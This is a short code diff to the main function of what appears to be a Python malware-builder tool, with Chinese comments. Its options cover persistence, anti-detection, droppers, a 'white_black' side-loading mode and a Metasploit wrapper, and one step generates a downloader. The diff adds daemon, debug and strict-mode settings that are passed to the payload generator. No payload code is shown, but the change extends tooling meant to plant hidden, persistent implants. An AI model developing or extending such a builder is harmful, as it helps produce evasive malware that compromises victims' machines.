@@ -55,6 +55,7 @@ def main():
                     'filename': args.filename,
                     'persistence': args.persistence,
                     'anti_detection': args.anti_detection,
+                    'daemon_mode': getattr(args, 'daemon', False),
                     'use_dropper': args.use_dropper,
                     'use_white_black': args.use_white_black,
                     'white_black_mode': args.white_black_mode,
@@ -193,7 +194,10 @@ def main():
                             config['filename'],
                             config['persistence'],
                             config['anti_detection'],
-                            config.get('silent_delay', 30)
+                            config.get('silent_delay', 30),
+                            config.get('debug', False),
+                            config.get('strict_mode', True),
+                            config.get('daemon_mode', False)
                         )
                     else:
                         # 直接保存MSF包装器  
@@ -327,7 +331,10 @@ def main():
                     config['filename'],
                     config['persistence'],
                     config['anti_detection'],
-                    config.get('silent_delay', 30)
+                    config.get('silent_delay', 30),
+                    config.get('debug', False),
+                    config.get('strict_mode', True),
+                    config.get('daemon_mode', False)
                 )
             
             # 2. 生成下载器文件
@@ -382,7 +389,10 @@ def main():
                     config['filename'],
                     config['persistence'],
                     config['anti_detection'],
-                    config.get('silent_delay', 30)
+                    config.get('silent_delay', 30),
+                    config.get('debug', False),
+                    config.get('strict_mode', True),
+                    config.get('daemon_mode', False)
                 )
             
             # 创建配置文件
